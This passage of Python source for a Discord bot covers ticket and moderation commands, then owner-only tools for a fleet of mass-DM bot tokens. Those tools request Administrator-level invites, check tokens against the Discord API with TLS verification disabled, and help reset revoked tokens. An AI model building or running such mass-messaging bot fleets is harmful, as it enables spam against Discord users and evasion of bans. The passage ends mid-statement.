                owner_mention = f"<@{self.owner_id}>" if self.owner_id else "Unknown"
                try:
                    await log_ch.send(embed=discord.Embed(
                        title="🔒  Ticket Closed",
                        description=(
                            f"**Channel:** #{ch.name}\n"
                            f"**Opened by:** {owner_mention}\n"
                            f"**Closed by:** {self.closer.mention}\n"
                            f"**Time:** <t:{int(time.time())}:F>"
                        ),
                        color=COLORS["error"],
                    ))
                except Exception:
                    pass
        if guild.id in _OPEN_TICKETS and self.owner_id in _OPEN_TICKETS.get(guild.id, {}):
            del _OPEN_TICKETS[guild.id][self.owner_id]
        await interaction.response.send_message(
            embed=discord.Embed(description="🔒 Closing in 3 seconds…", color=COLORS["warn"])
        )
        await asyncio.sleep(3)
        try:
            await ch.delete(reason=f"Ticket closed by {self.closer}")
        except Exception:
            pass

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(
            embed=discord.Embed(description="✅ Close cancelled.", color=COLORS["success"]),
            view=None,
        )


# ── Ticket commands ───────────────────────────────────────────────────
@bot.command(name="ticket", aliases=["newticket", "openticket"])
async def ticket_cmd(ctx, *, reason: str = None):
    """Open a ticket via a dropdown form."""
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Use this in a server.", color=COLORS["error"]))
    guild    = ctx.guild
    user     = ctx.author
    settings = _get_ticket_settings(guild.id)
    if guild.id in _OPEN_TICKETS and user.id in _OPEN_TICKETS[guild.id]:
        existing = guild.get_channel(_OPEN_TICKETS[guild.id][user.id])
        if existing:
            return await ctx.send(embed=discord.Embed(
                description=f"❌ You already have an open ticket: {existing.mention}", color=COLORS["error"]
            ))
    types   = settings.get("ticket_types", DEFAULT_TICKET_TYPES)
    options = [
        discord.SelectOption(label=t["label"], value=t["value"], emoji=t["emoji"], description=t["desc"][:100])
        for t in types[:25]
    ]
    class _QuickSelect(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)
            sel = discord.ui.Select(placeholder="Pick a ticket type…", options=options)
            async def _cb(interaction: discord.Interaction):
                if interaction.user.id != ctx.author.id:
                    return await interaction.response.send_message("Not yours!", ephemeral=False)
                chosen = next((t for t in types if t["value"] == sel.values[0]), types[0])
                await interaction.response.send_modal(TicketFormModal(chosen))
                self.stop()
            sel.callback = _cb
            self.add_item(sel)
    e = discord.Embed(title="🎫 Open a Ticket", description="Pick the type that best fits your issue:", color=0x5865F2)
    await ctx.send(embed=e, view=_QuickSelect(), delete_after=65)
    try:
        await ctx.message.delete(delay=3)
    except Exception:
        pass


@bot.command(name="closeticket", aliases=["tclose", "close"])
async def closeticket_cmd(ctx):
    """Close the current ticket."""
    guild = ctx.guild; ch = ctx.channel
    ticket_owner_id = None
    for uid, cid in _OPEN_TICKETS.get(guild.id, {}).items():
        if cid == ch.id:
            ticket_owner_id = uid; break
    if ticket_owner_id is None:
        return await ctx.send(embed=discord.Embed(description="❌ This channel isn't a ticket.", color=COLORS["error"]))
    if not _is_ticket_staff(ctx.author) and ctx.author.id != ticket_owner_id:
        return await ctx.send(embed=discord.Embed(description="❌ Only staff or the ticket owner can close this.", color=COLORS["error"]))
    settings = _get_ticket_settings(guild.id)
    _all_log_id = gdata(load("server_settings"), guild.id).get("mikasa_all_logs_channel")
    _ticket_log_id = _all_log_id or settings.get("log_channel_id")
    if _ticket_log_id:
        log_ch = guild.get_channel(int(_ticket_log_id))
        if log_ch:
            try:
                await log_ch.send(embed=discord.Embed(
                    title="🔒  Ticket Closed",
                    description=(
                        f"**Channel:** #{ch.name}\n"
                        f"**Opened by:** <@{ticket_owner_id}>\n"
                        f"**Closed by:** {ctx.author.mention}\n"
                        f"**Time:** <t:{int(time.time())}:F>"
                    ),
                    color=COLORS["error"],
                ))
            except Exception:
                pass
    if guild.id in _OPEN_TICKETS and ticket_owner_id in _OPEN_TICKETS.get(guild.id, {}):
        del _OPEN_TICKETS[guild.id][ticket_owner_id]
    await ctx.send(embed=discord.Embed(description="🔒 Closing in 3 seconds…", color=COLORS["warn"]))
    await asyncio.sleep(3)
    try:
        await ch.delete(reason=f"Ticket closed by {ctx.author}")
    except Exception:
        pass


@bot.command(name="adduser", aliases=["tadd"])
async def adduser_ticket_cmd(ctx, member: discord.Member):
    """Add a user to the current ticket."""
    guild = ctx.guild; ch = ctx.channel
    is_ticket = any(cid == ch.id for cid in _OPEN_TICKETS.get(guild.id, {}).values())
    if not is_ticket:
        return await ctx.send(embed=discord.Embed(description="❌ Only usable inside a ticket channel.", color=COLORS["error"]))
    ticket_owner_id = next((uid for uid, cid in _OPEN_TICKETS.get(guild.id, {}).items() if cid == ch.id), None)
    if not _is_ticket_staff(ctx.author) and ctx.author.id != ticket_owner_id:
        return await ctx.send(embed=discord.Embed(description="❌ You can't add users to this ticket.", color=COLORS["error"]))
    await ch.set_permissions(member, view_channel=True, send_messages=True, read_message_history=True, attach_files=True, embed_links=True)
    await ctx.send(embed=discord.Embed(description=f"✅ Added {member.mention} to this ticket.", color=COLORS["success"]))


@bot.command(name="removeuser", aliases=["tremove"])
async def removeuser_ticket_cmd(ctx, member: discord.Member):
    """Remove a user from the current ticket."""
    guild = ctx.guild; ch = ctx.channel
    is_ticket = any(cid == ch.id for cid in _OPEN_TICKETS.get(guild.id, {}).values())
    if not is_ticket:
        return await ctx.send(embed=discord.Embed(description="❌ Only usable inside a ticket channel.", color=COLORS["error"]))
    if not _is_ticket_staff(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Only staff can remove users.", color=COLORS["error"]))
    await ch.set_permissions(member, view_channel=False)
    await ctx.send(embed=discord.Embed(description=f"✅ Removed {member.mention} from this ticket.", color=COLORS["success"]))


@bot.command(name="tickets", aliases=["ticketlist", "tlist"])
async def tickets_list_cmd(ctx):
    """List all open tickets (staff only)."""
    if not _is_ticket_staff(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Staff only.", color=COLORS["error"]))
    guild  = ctx.guild
    open_t = _OPEN_TICKETS.get(guild.id, {})
    if not open_t:
        return await ctx.send(embed=discord.Embed(description="📭 No open tickets right now.", color=COLORS["info"]))
    lines = []
    for uid, cid in open_t.items():
        tch = guild.get_channel(cid)
        lines.append(f"• {tch.mention} — <@{uid}>" if tch else f"• ~~deleted~~ — <@{uid}>")
    e = discord.Embed(title=f"🎫  Open Tickets — {guild.name}", description="\n".join(lines), color=0x5865F2)
    e.set_footer(text=f"Coolbot Tickets  •  {len(lines)} open")
    await ctx.send(embed=e)


@bot.command(name="ticketpanel", aliases=["tpanel"])
@commands.has_permissions(manage_channels=True)
async def ticketpanel_cmd(ctx, channel: discord.TextChannel = None, *, title: str = None):
    """Send a dropdown ticket panel to a channel (staff only)."""
    ch       = channel or ctx.channel
    settings = _get_ticket_settings(ctx.guild.id)
    ptitle   = title or settings.get("panel_title", "Support Tickets")
    settings["panel_title"] = ptitle
    types    = settings.get("ticket_types", DEFAULT_TICKET_TYPES)
    type_list = "\n".join(f"{t['emoji']} **{t['label']}** — {t['desc']}" for t in types)
    pdesc = settings.get("panel_desc") or (
        "Need help from our staff team? Select the type of ticket below and fill in the form.\n\n"
        "🔒 Tickets are **private** — only you and staff can see them."
    )
    e = discord.Embed(title=f"🎫  {ptitle}", description=f"{pdesc}\n\n{type_list}", color=0x5865F2)
    e.set_footer(text="Coolbot Ticket System  •  🐻‍❄️  •  Select a category below")
    e.timestamp = discord.utils.utcnow()
    await ch.send(embed=e, view=TicketPanelView(ctx.guild.id))
    if ch != ctx.channel:
        await ctx.send(embed=discord.Embed(description=f"✅ Ticket panel sent to {ch.mention}.", color=COLORS["success"]), delete_after=5)


@bot.command(name="ticketlog", aliases=["setticketlog", "tlog"])
@commands.has_permissions(manage_channels=True)
async def ticketlog_cmd(ctx, channel: discord.TextChannel = None):
    """Set the ticket log channel."""
    ch = channel or ctx.channel
    _get_ticket_settings(ctx.guild.id)["log_channel_id"] = ch.id
    _save_ticket_settings()
    await ctx.send(embed=discord.Embed(description=f"✅ Ticket logs → {ch.mention}.", color=COLORS["success"]))


@bot.command(name="ticketrole", aliases=["setsupportrole", "trole"])
@commands.has_permissions(manage_channels=True)
async def ticketrole_cmd(ctx, role: discord.Role):
    """Set the support role that can see all tickets (staff only)."""
    _get_ticket_settings(ctx.guild.id)["support_role_id"] = role.id
    _save_ticket_settings()
    await ctx.send(embed=discord.Embed(
        description=f"✅ Support role set to {role.mention} — they can see all tickets.", color=COLORS["success"]
    ))


@bot.command(name="ticketoption", aliases=["topt", "tickettype"])
@commands.has_permissions(manage_channels=True)
async def ticketoption_cmd(ctx, action: str = "list", emoji: str = None, label: str = None, *, desc: str = None):
    """Manage ticket dropdown options.
    ,ticketoption list
    ,ticketoption add 🔧 "Server Help" "Help with server setup"
    ,ticketoption remove "Server Help"
    ,ticketoption reset
    """
    settings = _get_ticket_settings(ctx.guild.id)
    types    = settings.setdefault("ticket_types", list(DEFAULT_TICKET_TYPES))
    action   = action.lower()

    if action == "list":
        if not types:
            return await ctx.send(embed=discord.Embed(description="📭 No ticket types configured.", color=COLORS["info"]))
        lines = [f"{t['emoji']} **{t['label']}** — {t['desc']}" for t in types]
        e = discord.Embed(title="🎫  Ticket Types", description="\n".join(lines), color=0x5865F2)
        e.set_footer(text="Use ,ticketoption add/remove/reset to manage")
        return await ctx.send(embed=e)

    elif action == "add":
        if not emoji or not label:
            return await ctx.send(embed=discord.Embed(
                description="Usage: `,ticketoption add <emoji> <label> [description]`\nExample: `,ticketoption add 🔧 Server Help Help with the server`",
                color=COLORS["error"]
            ))
        if len(types) >= 25:
            return await ctx.send(embed=discord.Embed(description="❌ Max 25 ticket types per server.", color=COLORS["error"]))
        val = label.lower().replace(" ", "_")[:20]
        new_type = {"value": val, "emoji": emoji, "label": label[:80], "desc": (desc or label)[:100]}
        types.append(new_type)
        return await ctx.send(embed=discord.Embed(
            description=f"✅ Added **{emoji} {label}** to the ticket dropdown.", color=COLORS["success"]
        ))

    elif action == "remove":
        if not label:
            return await ctx.send(embed=discord.Embed(description="Usage: `,ticketoption remove <label>`", color=COLORS["error"]))
        before = len(types)
        settings["ticket_types"] = [t for t in types if t["label"].lower() != label.lower()]
        if len(settings["ticket_types"]) == before:
            return await ctx.send(embed=discord.Embed(description=f"❌ No type named **{label}** found.", color=COLORS["error"]))
        return await ctx.send(embed=discord.Embed(
            description=f"✅ Removed **{label}** from the ticket dropdown.", color=COLORS["success"]
        ))

    elif action == "reset":
        settings["ticket_types"] = list(DEFAULT_TICKET_TYPES)
        return await ctx.send(embed=discord.Embed(description="✅ Ticket types reset to defaults.", color=COLORS["success"]))

    else:
        await ctx.send(embed=discord.Embed(
            description="❌ Unknown action. Use `list`, `add`, `remove`, or `reset`.", color=COLORS["error"]
        ))




# ── Moderation cog (restored) ────────────────────────────────────────────
class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def _dm_owner(self, action: str, mod, target, guild, reason: str = ""):
        try:
            owner = await self.bot.fetch_user(OWNER_ID)
            e = discord.Embed(title=f"📋 {action}", color=COLORS["warn"])
            e.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
            e.add_field(name="Mod", value=f"{mod} (`{mod.id}`)", inline=True)
            e.add_field(name="Target", value=f"{target} (`{getattr(target, 'id', '?')}`)", inline=True)
            if reason:
                e.add_field(name="Reason", value=reason, inline=False)
            await owner.send(embed=e)
        except Exception:
            pass

    @commands.hybrid_command(name="kick", description="Kick a member")
    @app_commands.describe(member="Member to kick", reason="Reason")
    async def kick(self, ctx, member: discord.Member, *, reason: str = "No reason"):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.kick_members:
            return await ctx.send(embed=discord.Embed(description="❌ Need Kick Members.", color=COLORS["error"]))
        ok, err = can_moderate(ctx.author, member)
        if not ok:
            return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
        try:
            await member.kick(reason=f"{ctx.author}: {reason}")
            await ctx.send(embed=discord.Embed(description=f"👢 Kicked **{member}** — {reason}", color=COLORS["warn"]))
            await self._dm_owner("Kick", ctx.author, member, ctx.guild, reason)
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="ban", description="Ban a member")
    @app_commands.describe(member="Member to ban", reason="Reason")
    async def ban(self, ctx, member: discord.Member, *, reason: str = "No reason"):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.ban_members:
            return await ctx.send(embed=discord.Embed(description="❌ Need Ban Members.", color=COLORS["error"]))
        ok, err = can_moderate(ctx.author, member)
        if not ok:
            return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
        try:
            await member.ban(reason=f"{ctx.author}: {reason}", delete_message_days=0)
            await ctx.send(embed=discord.Embed(description=f"🔨 Banned **{member}** — {reason}", color=COLORS["error"]))
            await self._dm_owner("Ban", ctx.author, member, ctx.guild, reason)
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="unban", description="Unban a user by ID")
    @app_commands.describe(user_id="User ID to unban", reason="Reason")
    async def unban(self, ctx, user_id: str, *, reason: str = "No reason"):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.ban_members:
            return await ctx.send(embed=discord.Embed(description="❌ Need Ban Members.", color=COLORS["error"]))
        try:
            uid = int(user_id.strip())
            user = await self.bot.fetch_user(uid)
            await ctx.guild.unban(user, reason=f"{ctx.author}: {reason}")
            await ctx.send(embed=discord.Embed(description=f"✅ Unbanned **{user}**.", color=COLORS["success"]))
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="mute", description="Timeout a member")
    @app_commands.describe(member="Member to mute", duration="e.g. 5m, 1h, 1d", reason="Reason")
    async def mute(self, ctx, member: discord.Member, duration: str = "5m", *, reason: str = "No reason"):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.moderate_members:
            return await ctx.send(embed=discord.Embed(description="❌ Need Moderate Members.", color=COLORS["error"]))
        ok, err = can_moderate(ctx.author, member)
        if not ok:
            return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
        # parse duration
        units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
        duration = (duration or "5m").strip().lower()
        try:
            if duration[-1] in units:
                secs = int(duration[:-1]) * units[duration[-1]]
            else:
                secs = int(duration) * 60
        except Exception:
            secs = 300
        secs = max(60, min(secs, 28 * 86400))
        try:
            until = discord.utils.utcnow() + timedelta(seconds=secs)
            await member.timeout(until, reason=f"{ctx.author}: {reason}")
            await ctx.send(embed=discord.Embed(description=f"🔇 Muted **{member}** for **{duration}** — {reason}", color=COLORS["warn"]))
            await self._dm_owner("Mute", ctx.author, member, ctx.guild, reason)
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="unmute", description="Remove timeout from a member")
    @app_commands.describe(member="Member to unmute")
    async def unmute(self, ctx, member: discord.Member):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.moderate_members:
            return await ctx.send(embed=discord.Embed(description="❌ Need Moderate Members.", color=COLORS["error"]))
        try:
            await member.timeout(None, reason=f"Unmute by {ctx.author}")
            await ctx.send(embed=discord.Embed(description=f"🔊 Unmuted **{member}**.", color=COLORS["success"]))
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="warn", description="Warn a member")
    @app_commands.describe(member="Member to warn", reason="Reason")
    async def warn(self, ctx, member: discord.Member, *, reason: str = "No reason"):
        if not is_staff(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Staff only.", color=COLORS["error"]))
        ok, err = can_moderate(ctx.author, member)
        if not ok:
            return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
        data = load("warnings")
        gw = gdata(data, ctx.guild.id)
        uid = str(member.id)
        gw.setdefault(uid, []).append({
            "reason": reason,
            "mod": str(ctx.author),
            "time": datetime.now(timezone.utc).isoformat(),
        })
        save("warnings", data)
        total = len(gw[uid])
        await ctx.send(embed=discord.Embed(
            description=f"⚠️ **{member.display_name}** warned: {reason} ({total} total)",
            color=COLORS["warn"],
        ))
        await self._dm_owner("Warn", ctx.author, member, ctx.guild, reason)

    @commands.hybrid_command(name="warnings", description="View warnings for a member")
    async def warnings(self, ctx, member: discord.Member = None):
        member = member or ctx.author
        data = load("warnings")
        gw = gdata(data, ctx.guild.id)
        warns = gw.get(str(member.id), [])
        if not warns:
            return await ctx.send(embed=discord.Embed(description=f"**{member.display_name}** has no warnings.", color=COLORS["info"]))
        e = discord.Embed(title=f"⚠️ {member.display_name}'s Warnings ({len(warns)})", color=COLORS["warn"])
        for i, w in enumerate(warns[-10:], 1):
            e.add_field(name=f"#{i}", value=f"{w.get('reason', '?')} — {w.get('mod', '?')}", inline=False)
        await ctx.send(embed=e)

    @commands.hybrid_command(name="purge", description="Delete recent messages")
    @app_commands.describe(amount="Number of messages (max 500)")
    async def purge(self, ctx, amount: int = 10):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.manage_messages:
            return await ctx.send(embed=discord.Embed(description="❌ Need Manage Messages.", color=COLORS["error"]))
        amount = max(1, min(int(amount or 10), 500))
        try:
            deleted = await ctx.channel.purge(limit=amount + (0 if ctx.interaction else 1))
            await ctx.send(embed=discord.Embed(description=f"🧹 Deleted **{len(deleted)}** messages.", color=COLORS["success"]), delete_after=5)
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="setnick", aliases=["nick", "nickname"], description="Set or clear a member nickname")
    @app_commands.describe(member="Member", name="New nickname (empty to clear)")
    async def setnick(self, ctx, member: discord.Member, *, name: str = ""):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.manage_nicknames:
            return await ctx.send(embed=discord.Embed(description="❌ Need Manage Nicknames.", color=COLORS["error"]))
        if member.id == OWNER_ID and ctx.author.id != OWNER_ID:
            return await ctx.send(embed=discord.Embed(description="❌ You cannot change the bot owner's nickname.", color=COLORS["error"]))
        try:
            await member.edit(nick=name or None, reason=f"setnick by {ctx.author}")
            msg = f"✅ Nickname set to **{name}**." if name else f"✅ Nickname cleared for **{member}**."
            await ctx.send(embed=discord.Embed(description=msg, color=COLORS["success"]))
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="lock", description="Lock the channel")
    async def lock(self, ctx):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.manage_channels:
            return await ctx.send(embed=discord.Embed(description="❌ Need Manage Channels.", color=COLORS["error"]))
        try:
            overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = False
            await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite, reason=f"Lock by {ctx.author}")
            await ctx.send(embed=discord.Embed(description="🔒 Channel locked.", color=COLORS["warn"]))
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="unlock", description="Unlock the channel")
    async def unlock(self, ctx):
        if not is_staff(ctx.author) and not ctx.author.guild_permissions.manage_channels:
            return await ctx.send(embed=discord.Embed(description="❌ Need Manage Channels.", color=COLORS["error"]))
        try:
            overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = None
            await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite, reason=f"Unlock by {ctx.author}")
            await ctx.send(embed=discord.Embed(description="🔓 Channel unlocked.", color=COLORS["success"]))
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))

    @commands.hybrid_command(name="slowmode", aliases=["slowdown", "sm"], description="Set channel slowmode in seconds")
    @app_commands.describe(seconds="Seconds between messages (0 to disable)", channel="Channel to edit (default: current)")
    @commands.has_permissions(manage_channels=True)
    async def slowmode_cmd(self, ctx, seconds: int = 0, channel: discord.TextChannel = None):
        """Set slowmode. Examples: ,slowmode 5  ·  ,slowmode 0  ·  ,slowdown 10 #chat"""
        if not ctx.guild:
            return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
        ch = channel or ctx.channel
        if not isinstance(ch, discord.TextChannel):
            return await ctx.send(embed=discord.Embed(description="❌ Text channels only.", color=COLORS["error"]))
        seconds = max(0, min(int(seconds), 21600))  # Discord max 6h
        try:
            await ch.edit(slowmode_delay=seconds, reason=f"slowmode by {ctx.author}")
            if seconds == 0:
                desc = f"🐌 Slowmode **disabled** in {ch.mention}."
            else:
                desc = f"🐌 Slowmode set to **{seconds}s** in {ch.mention}."
            await ctx.send(embed=discord.Embed(description=desc, color=COLORS["success"]))
        except discord.Forbidden:
            await ctx.send(embed=discord.Embed(description="❌ Missing **Manage Channels**.", color=COLORS["error"]))
        except Exception as ex:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))



async def setup():
    for _cog_cls in (Moderation, AdminCog, Giveaways, Fun, Games, AntiNukeCog, LoggingCog, LevelingCog):
        try:
            await bot.add_cog(_cog_cls(bot))
            print(f"[setup] loaded {_cog_cls.__name__}")
        except Exception as ex:
            print(f"[setup] skip {_cog_cls.__name__}: {ex}")
    try:
        bot.add_view(TicketPanelView())
        bot.add_view(TicketCloseView())
    except Exception as ex:
        print(f"[setup] views: {ex}")
    try:
        _mikasa_refresh_allcommands_help()
    except Exception as ex:
        print(f"[setup] help index refresh: {ex}")

#  GLOBAL SLASH COMMAND ERROR HANDLER
#  Catches every unhandled /command exception and responds so
#  Discord never shows "The application did not respond."
@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    msg = str(error)
    if isinstance(error, app_commands.MissingPermissions):
        msg = "❌ You don't have permission to use this command."
    elif isinstance(error, app_commands.BotMissingPermissions):
        msg = "❌ I'm missing permissions to do that."
    elif isinstance(error, app_commands.CommandOnCooldown):
        msg = f"⏳ Command on cooldown. Try again in `{error.retry_after:.1f}s`."
    elif isinstance(error, app_commands.CheckFailure):
        msg = "❌ You're not allowed to use this command."
    else:
        msg = f"❌ Something went wrong: `{error}`"
    try:
        if interaction.response.is_done():
            await interaction.followup.send(
                embed=discord.Embed(description=msg, color=COLORS["error"]), ephemeral=False
            )
        else:
            await interaction.response.send_message(
                embed=discord.Embed(description=msg, color=COLORS["error"]), ephemeral=False
            )
    except Exception:
        pass


#  ,botcheck  — which massdm bots are in THIS server
import base64 as _b64chk

def _tok_to_id(token: str) -> Optional[int]:
    try:
        seg = token.split(".")[0]
        pad = seg + "=" * (-len(seg) % 4)
        return int(_b64chk.b64decode(pad).decode())
    except Exception:
        return None

@bot.command(name="botcheck", aliases=["checkbots", "bc"])
async def botcheck_cmd(ctx):
    if not has_owner_access(ctx.author) and ctx.author.id not in PREMIUM_USERS:
        return
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(
            description="❌ Run this inside a server.", color=COLORS["error"]
        ))

    msg = await ctx.send(embed=discord.Embed(
        title="🔍 Scanning server…",
        description=f"Checking {len(MASSDM_BOT_TOKENS)} tokens against **{ctx.guild.name}**",
        color=COLORS["info"]
    ))

    in_server, missing_invites = [], []
    for i, tok in enumerate(MASSDM_BOT_TOKENS, 1):
        bid = _tok_to_id(tok)
        if bid is None:
            missing_invites.append(f"❓ `{i:02d}` — decode error")
            continue
        member = ctx.guild.get_member(bid)
        if member:
            in_server.append(f"✅ `{i:02d}` **{member.display_name}** (`{bid}`)")
        else:
            link = (
                f"https://discord.com/oauth2/authorize"
                f"?client_id={bid}&permissions=8&scope=bot%20applications.commands"
            )
            missing_invites.append(f"❌ `{i:02d}` [`{bid}`]({link}) — **[Add to server]({link})**")

    total     = len(MASSDM_BOT_TOKENS)
    in_count  = len(in_server)
    out_count = len(missing_invites)

    await msg.edit(embed=discord.Embed(
        title=f"🤖 Bot Check — {ctx.guild.name}",
        description=f"**{in_count}/{total}** bots are in this server.\nInvite links for missing bots sent to your DMs.",
        color=COLORS["success"] if in_count == total else COLORS["warn"]
    ))

    # DM in-server list
    if in_server:
        in_txt = "\n".join(in_server)
        for chunk in [in_txt[i:i+1900] for i in range(0, len(in_txt), 1900)]:
            try:
                await ctx.author.send(embed=discord.Embed(
                    title=f"✅ Bots IN {ctx.guild.name} ({in_count}/{total})",
                    description=chunk,
                    color=COLORS["success"]
                ))
            except Exception:
                pass

    # DM missing bots with their invite links
    if missing_invites:
        missing_txt = "\n".join(missing_invites)
        for chunk in [missing_txt[i:i+1900] for i in range(0, len(missing_txt), 1900)]:
            try:
                await ctx.author.send(embed=discord.Embed(
                    title=f"❌ Bots NOT in {ctx.guild.name} ({out_count}/{total}) — click to add",
                    description=chunk,
                    color=COLORS["error"]
                ))
            except Exception:
                pass


@bot.command(name="tokencheck", aliases=["checktokens", "tc"])
async def tokencheck_cmd(ctx):
    """Owner only — hit Discord API live for every token and report valid vs dead."""
    if not has_owner_access(ctx.author):
        return

    msg = await ctx.send(embed=discord.Embed(
        title="🔍 Checking all tokens live…",
        description=f"Pinging Discord API for all **{len(MASSDM_BOT_TOKENS)}** tokens. This may take ~30s.",
        color=COLORS["info"]
    ))

    alive, dead = [], []
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def _check(i, tok):
            headers = {"Authorization": f"Bot {tok}", "Content-Type": "application/json"}
            try:
                async with session.get(
                    "https://discord.com/api/v10/users/@me",
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status == 200:
                        data = await r.json()
                        name = data.get("username", "Unknown")
                        uid  = data.get("id", _decode_bot_user_id(tok) or "?")
                        alive.append((i, name, uid))
                    elif r.status == 429:
                        data = await r.json()
                        await asyncio.sleep(float(data.get("retry_after", 2)))
                        alive.append((i, "rate-limited", _decode_bot_user_id(tok) or "?"))
                    else:
                        uid = _decode_bot_user_id(tok) or "?"
                        dead.append((i, uid))
            except Exception:
                uid = _decode_bot_user_id(tok) or "?"
                dead.append((i, uid))

        await asyncio.gather(*[_check(i, tok) for i, tok in enumerate(MASSDM_BOT_TOKENS, 1)], return_exceptions=True)

    alive.sort(key=lambda x: x[0])
    dead.sort(key=lambda x: x[0])

    await msg.edit(embed=discord.Embed(
        title="✅ Token Check Complete",
        description=(
            f"🟢 **{len(alive)} alive** — bots with valid tokens\n"
            f"🔴 **{len(dead)} dead** — tokens revoked/invalid\n\n"
            f"Full report sent to your DMs."
        ),
        color=COLORS["success"] if not dead else COLORS["warn"]
    ))

    try:
        dm = await ctx.author.create_dm()

        if alive:
            alive_lines = "\n".join(f"🟢 `{i:02d}` **{name}** (`{uid}`)" for i, name, uid in alive)
            for chunk in [alive_lines[x:x+1900] for x in range(0, len(alive_lines), 1900)]:
                await dm.send(embed=discord.Embed(
                    title=f"🟢 Alive Tokens ({len(alive)}/{len(MASSDM_BOT_TOKENS)})",
                    description=chunk, color=COLORS["success"]
                ))

        if dead:
            dead_lines = "\n".join(
                f"🔴 `{i:02d}` `{uid}` — [Reset Token](https://discord.com/developers/applications/{uid}/bot)"
                for i, uid in dead
            )
            for chunk in [dead_lines[x:x+1900] for x in range(0, len(dead_lines), 1900)]:
                await dm.send(embed=discord.Embed(
                    title=f"🔴 Dead Tokens ({len(dead)}/{len(MASSDM_BOT_TOKENS)}) — click to reset",
                    description=chunk, color=COLORS["error"]
                ))
    except Exception:
        pass


@bot.command(name="tokenrenew", aliases=["renewtokens", "tr"])
async def tokenrenew_cmd(ctx):
    """Owner only — DM direct dev portal links for every dead token so you can reset them fast."""
    if not has_owner_access(ctx.author):
        return

    msg = await ctx.send(embed=discord.Embed(
        title="🔄 Scanning for dead tokens…",
        description=f"Checking all **{len(MASSDM_BOT_TOKENS)}** tokens against Discord API.",
        color=COLORS["info"]
    ))

    dead = []
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def _check_dead(i, tok):
            headers = {"Authorization": f"Bot {tok}", "Content-Type": "application/json"}
            try:
                async with session.get(
                    "https://discord.com/api/v10/users/@me",
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status != 200 and r.status != 429:
                        uid = _decode_bot_user_id(tok) or "?"
                        dead.append((i, uid))
            except Exception:
                uid = _decode_bot_user_id(tok) or "?"
                dead.append((i, uid))

        await asyncio.gather(*[_check_dead(i, tok) for i, tok in enumerate(MASSDM_BOT_TOKENS, 1)], return_exceptions=True)

    dead.sort(key=lambda x: x[0])

    if not dead:
        await msg.edit(embed=discord.Embed(
            title="✅ All tokens alive!",
            description="Every token in `MASSDM_BOT_TOKENS` is valid. Nothing to renew.",
            color=COLORS["success"]
        ))
        return

    await msg.edit(embed=discord.Embed(
        title=f"🔴 {len(dead)} dead tokens found",
        description=(
            f"**{len(dead)}** tokens are revoked/invalid.\n\n"
            "Steps to fix:\n"
            "1️⃣ Open each link sent to your DMs\n"
            "2️⃣ Click **Reset Token** → copy the new token\n"
            "3️⃣ Replace the old token in `MASSDM_BOT_TOKENS` in the bot file\n"
            "4️⃣ Re-deploy the bot on Railway"
        ),
        color=COLORS["error"]
    ))

    try:
        dm = await ctx.author.create_dm()
        lines = []
        for i, uid in dead:
            portal = f"https://discord.com/developers/applications/{uid}/bot"
            lines.append(f"🔴 **Bot {i:02d}** (`{uid}`)\n[👉 Reset Token Here]({portal})\n")

        body = "\n".join(lines)
        for chunk in [body[x:x+1900] for x in range(0, len(body), 1900)]:
            await dm.send(embed=discord.Embed(
